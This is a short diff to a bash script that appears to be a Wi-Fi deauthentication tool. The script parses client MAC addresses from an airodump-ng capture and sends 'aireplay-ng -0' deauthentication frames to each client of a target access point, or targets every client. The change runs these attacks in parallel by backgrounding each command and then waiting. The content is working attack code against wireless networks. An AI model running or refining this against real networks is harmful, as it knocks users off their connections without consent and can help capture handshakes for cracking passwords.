@@ -23,8 +23,9 @@ then
 	while read -r mac
 	do
 		echo "killing $mac"
-		sudo aireplay-ng "$1"mon -a "$2" -c "$mac" -0 3
+		sudo aireplay-ng "$1"mon -a "$2" -c "$mac" -0 3 &
 	done < <(tail -n+6 wk-01.csv | cut -c1-17 | grep -Eo "([A-Z0-9]{2}:){5}([A-Z0-9]){2}" | sort | diff "$5"sorted - | grep -Eo "([A-Z0-9]{2}:){5}([A-Z0-9]){2}")
+	wait
 else
 	echo "no mode specified, targeting everyone..."
 	sudo airodump-ng "$1"mon --bssid "$2" -c "$3" -w wk
